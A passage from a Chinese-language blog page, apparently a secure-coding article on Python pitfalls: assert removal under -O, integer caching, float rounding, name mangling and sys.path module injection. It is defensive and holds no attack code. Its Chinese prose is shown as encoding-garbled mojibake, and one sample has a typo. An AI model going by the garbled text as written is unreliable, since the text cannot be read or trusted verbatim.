<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ä¸å¯ä¸çŸ¥çš„Pythoné™·é˜± | Ronald Zhao&#39;s Blog</title>
    <meta name="description" content="Stay hungary. Stay foolish. â€”â€” Steve Jobs">
    <link rel="icon" href="/logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.d05eef06.css" as="style"><link rel="preload" href="/assets/js/app.59328fb8.js" as="script"><link rel="preload" href="/assets/js/31.6649ea1a.js" as="script"><link rel="prefetch" href="/assets/js/16.1fae64bc.js"><link rel="prefetch" href="/assets/js/2.cda51ec0.js"><link rel="prefetch" href="/assets/js/3.594dbaab.js"><link rel="prefetch" href="/assets/js/4.93dc01eb.js"><link rel="prefetch" href="/assets/js/5.de845ab4.js"><link rel="prefetch" href="/assets/js/6.3b644b27.js"><link rel="prefetch" href="/assets/js/7.5e617c78.js"><link rel="prefetch" href="/assets/js/8.4c63ab4c.js"><link rel="prefetch" href="/assets/js/9.ab0a257f.js"><link rel="prefetch" href="/assets/js/10.13498c22.js"><link rel="prefetch" href="/assets/js/11.48c3f634.js"><link rel="prefetch" href="/assets/js/12.5f85273c.js"><link rel="prefetch" href="/assets/js/13.c78e7180.js"><link rel="prefetch" href="/assets/js/14.4fe85a28.js"><link rel="prefetch" href="/assets/js/15.1b676b9b.js"><link rel="prefetch" href="/assets/js/17.b8785dfe.js"><link rel="prefetch" href="/assets/js/18.a2fcfaee.js"><link rel="prefetch" href="/assets/js/19.6955a727.js"><link rel="prefetch" href="/assets/js/20.168286f5.js"><link rel="prefetch" href="/assets/js/21.082ab17d.js"><link rel="prefetch" href="/assets/js/22.a2f7eb53.js"><link rel="prefetch" href="/assets/js/23.cda24da2.js"><link rel="prefetch" href="/assets/js/24.44073542.js"><link rel="prefetch" href="/assets/js/25.28c06356.js"><link rel="prefetch" href="/assets/js/26.de3bbeef.js"><link rel="prefetch" href="/assets/js/27.1aafdddc.js"><link rel="prefetch" href="/assets/js/28.44319886.js"><link rel="prefetch" href="/assets/js/29.cef23746.js"><link rel="prefetch" href="/assets/js/30.78505d88.js"><link rel="prefetch" href="/assets/js/32.ee9dae17.js"><link rel="prefetch" href="/assets/js/33.a38584d9.js"><link rel="prefetch" href="/assets/js/34.81809b32.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d05eef06.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Ronald Zhao's Blog</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/python3/" class="nav-link router-link-active">Python3</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">åˆ·é¢˜</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/lintcode/" class="nav-link">LintCode</a></li><li class="dropdown-item"><!----> <a href="/codewars/" class="nav-link">CodeWars</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">æ•°æ®åº“</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/mysql/" class="nav-link">MySQL</a></li><li class="dropdown-item"><!----> <a href="/redis/" class="nav-link">Redis</a></li></ul></div></div><div class="nav-item"><a href="/algorithms/" class="nav-link">Algorithm</a></div><div class="nav-item"><a href="/guide/" class="nav-link">Guide</a></div><div class="nav-item"><a href="/notes/" class="nav-link">Notes</a></div><div class="nav-item"><a href="/devtools/" class="nav-link">Tools</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/love/" class="nav-link">ğŸ’—</a></div> <a href="https://github.com/RonaldZhao/RonaldZhao.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/python3/" class="nav-link router-link-active">Python3</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">åˆ·é¢˜</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/lintcode/" class="nav-link">LintCode</a></li><li class="dropdown-item"><!----> <a href="/codewars/" class="nav-link">CodeWars</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">æ•°æ®åº“</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/mysql/" class="nav-link">MySQL</a></li><li class="dropdown-item"><!----> <a href="/redis/" class="nav-link">Redis</a></li></ul></div></div><div class="nav-item"><a href="/algorithms/" class="nav-link">Algorithm</a></div><div class="nav-item"><a href="/guide/" class="nav-link">Guide</a></div><div class="nav-item"><a href="/notes/" class="nav-link">Notes</a></div><div class="nav-item"><a href="/devtools/" class="nav-link">Tools</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/love/" class="nav-link">ğŸ’—</a></div> <a href="https://github.com/RonaldZhao/RonaldZhao.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><div class="sidebar-group first"><p class="sidebar-heading open"><span>ä¸å¯ä¸çŸ¥çš„Pythoné™·é˜±</span> <!----></p> <ul class="sidebar-group-items"><li><a href="/python3/traps.html#æ–­è¨€è¯­å¥" class="sidebar-link">æ–­è¨€è¯­å¥</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#å¯é‡ç”¨æ•´æ•°" class="sidebar-link">å¯é‡ç”¨æ•´æ•°</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#æµ®ç‚¹æ•°æ¯”è¾ƒ" class="sidebar-link">æµ®ç‚¹æ•°æ¯”è¾ƒ</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#ç§æœ‰å±æ€§" class="sidebar-link">ç§æœ‰å±æ€§</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#æ¨¡å—æ³¨å…¥" class="sidebar-link">æ¨¡å—æ³¨å…¥</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#å¯¼å…¥æ—¶çš„ä»£ç æ‰§è¡Œ" class="sidebar-link">å¯¼å…¥æ—¶çš„ä»£ç æ‰§è¡Œ</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#çŒ´å­è¡¥ä¸-monkey-patching" class="sidebar-link">çŒ´å­è¡¥ä¸(monkey patching)</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/python3/traps.html#ç¬”è®°æ•´ç†æ¥æº" class="sidebar-link">ç¬”è®°æ•´ç†æ¥æº</a><ul class="sidebar-sub-headers"></ul></li></ul></div></li></ul> </div> <div class="page"> <div class="content"><h1 id="ä¸å¯ä¸çŸ¥çš„pythoné™·é˜±"><a href="#ä¸å¯ä¸çŸ¥çš„pythoné™·é˜±" aria-hidden="true" class="header-anchor">#</a> ä¸å¯ä¸çŸ¥çš„Pythoné™·é˜±</h1> <div class="tip custom-block"><p class="custom-block-title">æ³¨æ„</p> <p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨åŸºäº<code>python3</code></p></div> <h2 id="æ–­è¨€è¯­å¥"><a href="#æ–­è¨€è¯­å¥" aria-hidden="true" class="header-anchor">#</a> æ–­è¨€è¯­å¥</h2> <p>åœ¨pythonåº”ç”¨ä¸­ä½¿ç”¨<code>assert</code>è¯­å¥æ¥æ•è·ä¸å¯èƒ½çš„æ¡ä»¶æ˜¯ä¸€ä¸ªç¼–ç¨‹ä¹ æƒ¯ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">verify_credentials</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> username <span class="token operator">and</span> password<span class="token punctuation">,</span> <span class="token string">'Credentials not supplied by caller'</span>
    
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> authenticate possibly null user <span class="token keyword">with</span> null password <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ç„¶è€Œï¼Œå½“å°†æºç ç¼–è¯‘æˆä¼˜åŒ–çš„å­—èŠ‚ç å(ä¾‹å¦‚<code>python -O</code>)ï¼Œpythonå¹¶ä¸ä¼šä¸º<code>assert</code>è¯­å¥ç”Ÿæˆä»»ä½•æŒ‡ä»¤ï¼Œç¼–è¯‘å™¨ä¼šé»˜é»˜åœ°åˆ é™¤é‚£äº›ç¨‹åºå‘˜å†™çš„è®©ç¨‹åºå…å—ç•¸å½¢æ•°æ®æ”»å‡»çš„ä»£ç ï¼Œè®©åº”ç”¨æš´éœ²åœ¨æ”»å‡»ä¸­ã€‚</p> <p>è¯¥æ¼æ´çš„æ ¹æœ¬åŸå› åœ¨äº<code>assertæœºåˆ¶</code>çº¯ç²¹æ˜¯ä¸ºäº†æµ‹è¯•çš„ç›®çš„è€Œè®¾è®¡çš„ï¼Œæ­£å¦‚åœ¨C++ä¸­çš„é‚£æ ·ã€‚æ‰€ä»¥ç¨‹åºå‘˜å¿…é¡»ä½¿ç”¨å…¶ä»–æ‰‹æ®µä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p> <h2 id="å¯é‡ç”¨æ•´æ•°"><a href="#å¯é‡ç”¨æ•´æ•°" aria-hidden="true" class="header-anchor">#</a> å¯é‡ç”¨æ•´æ•°</h2> <p>pythonä¸­ä¸‡ç‰©çš†å¯¹è±¡ã€‚æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨<code>id()</code>å‡½æ•°æ¥è·å–ã€‚è¦æ‰¾å‡ºä¸¤ä¸ªå˜é‡æˆ–ä¸¤ä¸ªå±æ€§æ˜¯å¦éƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨<code>is</code>æ“ä½œç¬¦ã€‚æ•´æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå› æ­¤<code>is</code>æ“ä½œç¬¦ç¡®å®æ˜¯ä¸ºä»–ä»¬å®šä¹‰çš„ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">999</span><span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">is</span> <span class="token number">1000</span>
<span class="token boolean">False</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¦‚æœä¸Šé¢çš„ç»“æœçœ‹èµ·æ¥ä»¤äººè¯§å¼‚ï¼Œé‚£ä¹ˆè®°ä½ï¼Œ<code>is</code>æ“ä½œç¬¦æ˜¯åœ¨ä¸¤ä¸ªå¯¹è±¡çš„æ ‡è¯†ç¬¦ä¸Šå·¥ä½œçš„â€”â€”å®ƒå¹¶ä¸æ¯”è¾ƒå®ƒä»¬çš„æ•°å€¼æˆ–å…¶ä»–å€¼ã€‚ç„¶è€Œï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token operator">+</span><span class="token number">1</span> <span class="token keyword">is</span> <span class="token number">2</span>
<span class="token boolean">True</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¾ˆå¥‡æ€ªå¯¹ä¸å¯¹ï¼Ÿå¯¹è¯¥è¡Œä¸ºçš„è§£é‡Šæ˜¯ï¼špythonç»´æŠ¤äº†ä¸€ä¸ªå¯¹è±¡è¿æ¥æ± ï¼Œå…¶ä¸­ä¿æœ‰å‰å‡ ç™¾ä¸ªæ•´æ•°(å°æ•´æ•°)ï¼Œé‡ç”¨å®ƒä»¬ä¼šå†…å­˜å’Œå¯¹è±¡çš„åˆ›å»ºã€‚æ›´è®©äººå‡Œä¹±çš„æ˜¯ï¼Œ&quot;å°æ•´æ•°&quot;çš„å®šä¹‰åœ¨ä¸åŒçš„pythonç‰ˆæœ¬ä¸­å¹¶ä¸ç›¸åŒã€‚</p> <p>è¿™é‡Œçš„åº”å¯¹æªæ–½æ˜¯ï¼šç»å¯¹ä¸è¦æŠŠ<code>is</code>æ“ä½œç¬¦ç”¨äºå€¼çš„æ¯”è¾ƒä¸Šã€‚<code>is</code>æ“ä½œç¬¦æ˜¯è®¾è®¡ç”¨æ¥å¤„ç†å”¯ä¸€å¯¹è±¡æ ‡è¯†ç¬¦çš„ã€‚</p> <h2 id="æµ®ç‚¹æ•°æ¯”è¾ƒ"><a href="#æµ®ç‚¹æ•°æ¯”è¾ƒ" aria-hidden="true" class="header-anchor">#</a> æµ®ç‚¹æ•°æ¯”è¾ƒ</h2> <p>ç”±äºå›ºå®šä¸”æœ‰é™çš„ç²¾åº¦ï¼Œä»¥åŠåè¿›åˆ¶ä¸äºŒè¿›åˆ¶å°æ•°è¡¨ç¤ºæ‰€äº§ç”Ÿçš„å·®å¼‚ï¼Œä½¿ç”¨æµ®ç‚¹æ•°å¯èƒ½å¾ˆå¤æ‚ã€‚æ··ä¹±çš„ä¸€ä¸ªå¸¸è§åŸå› æ˜¯ï¼Œæµ®ç‚¹æ•°æ¯”è¾ƒæœ‰æ—¶å¯èƒ½ä¼šäº§ç”Ÿæ„æƒ³ä¸åˆ°çš„ç»“æœï¼Œä¾‹å¦‚ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token number">2.2</span> <span class="token operator">*</span> <span class="token number">3.0</span> <span class="token operator">==</span> <span class="token number">3.3</span> <span class="token operator">*</span> <span class="token number">2.0</span>
<span class="token boolean">False</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ç»“æœçš„åŸå› å®é™…ä¸Šæ˜¯èˆå…¥é”™è¯¯ï¼š</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">2.2</span> <span class="token operator">*</span> <span class="token number">3.0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'0x1.a666666666667p+2'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">3.3</span><span class="token operator">*</span><span class="token number">2.0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'0x1.a666666666666p+2'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ä¸€èˆ¬æ¥è¯´ï¼Œå½“é‡è¦çš„å†³å®šæ˜¯åŸºäºç®—æœ¯è¿ç®—çš„ç»“æœåšå‡ºçš„ï¼Œå°±å¿…é¡»è¦å°å¿ƒä¸è¦æˆä¸ºèˆå…¥é”™è¯¯çš„ç‰ºç‰²å“ã€‚å‚è§pythonæ–‡æ¡£ä¸­çš„<a href="https://docs.python.org/3/tutorial/floatingpoint.html" target="_blank" rel="noopener noreferrer">Floating Point Arithmetic: Issues and Limitations<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ç« èŠ‚ã€‚</p> <h2 id="ç§æœ‰å±æ€§"><a href="#ç§æœ‰å±æ€§" aria-hidden="true" class="header-anchor">#</a> ç§æœ‰å±æ€§</h2> <p>pythonä¸æ”¯æŒå¯¹è±¡å±æ€§éšè—ã€‚ä½†æœ‰ä¸€ä¸ªåŸºäº<a href="https://docs.python.org/3/tutorial/classes.html#tut-private" target="_blank" rel="noopener noreferrer">åŒä¸‹åˆ’çº¿å±æ€§é‡æ•´<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ç‰¹æ€§çš„è§£å†³æ–¹æ¡ˆã€‚è™½ç„¶å±æ€§åçš„ä¿®æ”¹<a href="https://docs.python.org/3/reference/expressions.html#atom-identifiers" target="_blank" rel="noopener noreferrer">åªå‘ç”Ÿåœ¨ä»£ç ä¸Š<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>ï¼Œä½†æ˜¯ç¡¬ç¼–ç åˆ°å­—ç¬¦ä¸²å¸¸é‡çš„å±æ€§åä¿æŒä¸å˜ã€‚å½“ä¸€ä¸ªåŒä¸‹åˆ’çº¿çš„å±æ€§æ˜æ˜¾ä»<code>getattr()</code>/<code>setattr()</code>å‡½æ•°éšè—ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ··ä¹±çš„è¡Œä¸ºã€‚</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> classX<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>__private <span class="token operator">=</span> <span class="token number">1</span>
        <span class="token keyword">def</span> <span class="token function">get_private</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__private
        <span class="token keyword">def</span> <span class="token function">has_private</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">'__private'</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> X<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">.</span>has_private<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token boolean">False</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">.</span>get_private<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token number">1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>è¦è®©è¿™ä¸ªç§æœ‰ç‰¹æ€§èƒ½ç”¨ï¼Œç±»å®šä¹‰ä¹‹å¤–çš„å±æ€§å¹¶ä¸æ‰§è¡Œå±æ€§é‡æ•´(attribute mangling)ã€‚åŸºäºè¢«å¼•ç”¨çš„åœ°æ–¹ï¼Œå®ƒæœ‰æ•ˆåœ°å°†ä»»æ„ç»™å®šçš„åŒä¸‹åˆ’çº¿å±æ€§&quot;åˆ†è£‚&quot;æˆä¸¤ç±»ã€‚</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">class</span> <span class="token class-name">X</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>__private <span class="token operator">=</span> <span class="token number">1</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> X<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">.</span>__private
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">&quot;&lt;stdin&gt;&quot;</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">&gt;</span>
AttributeError<span class="token punctuation">:</span> <span class="token string">'X'</span> <span class="token builtin">object</span> has no attribute <span class="token string">'__private'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">.</span>__private <span class="token operator">=</span> <span class="token number">2</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x<span class="token punctuation">.</span>__private
<span class="token number">2</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token string">&quot;__private&quot;</span><span class="token punctuation">)</span>
<span class="token boolean">True</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>å¦‚æœç¨‹åºå‘˜ä¾èµ–äºåŒä¸‹åˆ’çº¿å±æ€§æ¥åœ¨ä»–ä»¬çš„ä»£ç ä¸­åšå‡ºé‡è¦å†³å®šï¼Œè€Œä¸å…³æ³¨ç§æœ‰å±æ€§çš„ä¸å¯¹ç§°è¡Œä¸ºï¼Œé‚£ä¹ˆè¿™äº›å°æŠ€å·§ä¼šå˜æˆå®‰å…¨æ¼æ´ã€‚</p> <h2 id="æ¨¡å—æ³¨å…¥"><a href="#æ¨¡å—æ³¨å…¥" aria-hidden="true" class="header-anchor">#</a> æ¨¡å—æ³¨å…¥</h2> <p>pythonçš„æ¨¡å—å¯¼å…¥ç³»ç»ŸåŠŸèƒ½å¼ºå¤§è€Œå¤æ‚ã€‚æ¨¡å—å’ŒåŒ…å¯ä»¥é€šè¿‡å®šä¹‰åœ¨<a href="https://docs.python.org/3/library/sys.html#sys.path" target="_blank" rel="noopener noreferrer">sys.path<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>åˆ—è¡¨ä¸­çš„æœç´¢è·¯å¾„æ‰¾åˆ°çš„æ–‡ä»¶åæˆ–ç›®å½•åå¯¼å…¥ã€‚æœç´¢è·¯å¾„åˆå§‹åŒ–æ˜¯ä¸€ä¸ªå¤æ‚çš„è¿‡ç¨‹ï¼Œå®ƒä¹Ÿä¾èµ–äºpythonç‰ˆæœ¬ã€å¹³å°å’Œæœ¬åœ°é…ç½®ã€‚è¦å¯¹ä¸€ä¸ªpythonåº”ç”¨ç¨‹åºè¿›è¡ŒæˆåŠŸæ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥å°†æ¶æ„pythonæ¨¡å—æ‰å…¥è¿›pythonåœ¨å°è¯•å¯¼å…¥æ¨¡å—æ—¶ä¼šè€ƒè™‘çš„ä¸€ä¸ªç›®å½•æˆ–å¯å¯¼å…¥åŒ…æ–‡ä»¶ã€‚</p> <p>å¤„ç†æªæ–½æ˜¯ç»´æŠ¤æœç´¢è·¯å¾„ä¸­çš„æ‰€æœ‰ç›®å½•å’ŒåŒ…æ–‡ä»¶çš„å®‰å…¨è®¿é—®æƒé™ï¼Œä»¥ç¡®ä¿æœªç»æˆæƒçš„ç”¨æˆ·æ— æ³•å¯¹å…¶è¿›è¡Œå†™è®¿é—®ã€‚è¯·è®°ä½ï¼Œè°ƒç”¨pythonè§£é‡Šå™¨çš„åˆå§‹è„šæœ¬æ‰€åœ¨çš„ç›®å½•ä¼šè‡ªåŠ¨æ’å…¥åˆ°æœç´¢è·¯å¾„ä¸­ã€‚</p> <p>è¿è¡Œåƒè¿™æ ·çš„è„šæœ¬æ¥æ˜¾ç¤ºå®é™…çš„æœç´¢è·¯å¾„ï¼š</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>$ <span class="token function">cat</span> myapp.py
<span class="token comment">#!/usr/bin/python3</span>
<span class="token function">import</span> sys
<span class="token function">import</span> pprint

pprint.pprint<span class="token punctuation">(</span>sys.path<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>åœ¨Windowså¹³å°ï¼Œpythonè¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ï¼Œè€Œä¸æ˜¯è„šæœ¬æ‰€åœ¨ä½ç½®ï¼Œä¼šè¢«<a href="https://docs.python.org/3/using/windows.html#finding-modules" target="_blank" rel="noopener noreferrer">æ³¨å…¥<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 